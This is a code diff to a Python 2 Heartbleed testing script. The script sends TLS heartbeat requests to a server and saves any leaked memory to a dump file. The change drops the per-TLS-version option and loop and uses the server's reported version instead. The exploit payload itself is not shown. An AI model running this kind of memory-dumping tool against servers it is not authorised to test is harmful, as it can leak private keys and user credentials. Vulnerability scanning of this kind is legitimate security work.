@@ -17,7 +17,6 @@ options = OptionParser(usage='%prog server [options]', description='Test for SSL
 options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
 options.add_option('-n', '--num', type='int', default=1, help='Number of heartbeats to send if vulnerable (defines how much memory you get back) (default: 1)')
 options.add_option('-f', '--file', type='str', default='dump.bin', help='Filename to write dumped memory too (default: dump.bin)')
-options.add_option('-v', '--ver', type='int', default=0, help='TLS version 1 is 1.0, 2 is 1.1, 3 is 1.2, 0 will try all (default: 0)')
 options.add_option('-q', '--quiet', default=False, help='Do not display the memory dump', action='store_true')
 options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS (smtp only right now)')
 
@@ -146,7 +145,7 @@ def parseresp(s):
 		if typ == 22 and ord(pay[0]) == 0x0E:
 			return ver
 
-def check(host, port, version, dumpf, quiet, starttls):
+def check(host, port, dumpf, quiet, starttls):
 	response = False
 	if starttls:
 		try:
@@ -174,15 +173,14 @@ def check(host, port, version, dumpf, quiet, starttls):
 		s = connect(host, port, quiet)
 		tls(s,quiet)
 
-	serverversion = parseresp(s)
+	version = parseresp(s)
 
-	if serverversion == 0:
+	if version == 0:
 		if not quiet: print "Got an error while parsing the response, bailing ..."
 		return False
 	else:
-		serverversion = serverversion - 0x0300
-		if not quiet: print "Our version was %d, server version was %d\n" % (version, serverversion)
-		version = serverversion
+		version = version - 0x0300
+		if not quiet: print "Server TLS version was 1.%d\n" % version
 
 	if not quiet: print 'Sending heartbeat request...'
 	sys.stdout.flush()
@@ -206,18 +204,7 @@ def main():
 
 	print 'Scanning ' + args[0] + ' on port ' + str(opts.port)
 	for i in xrange(0,opts.num):
-		if (opts.ver == 0):
-			one = 0
-			two = 0
-			three = 0
-			one = check(args[0], opts.port, 1, opts.file, opts.quiet, opts.starttls)
-			two = check(args[0], opts.port, 2, opts.file, opts.quiet, opts.starttls)
-			three = check(args[0], opts.port, 3, opts.file, opts.quiet, opts.starttls)
-			if one: print 'TLS v1.0 on '+ args[0] +' is vulnerable'
-			if two: print 'TLS v1.1 on '+ args[0] +' is vulnerable'
-			if three: print 'TLS v1.2 on '+ args[0] +' is vulnerable'
-		else:
-			check(args[0], opts.port, opts.ver, opts.file, opts.quiet, opts.starttls)
+		check(args[0], opts.port, opts.file, opts.quiet, opts.starttls)
 
 if __name__ == '__main__':
 	main()
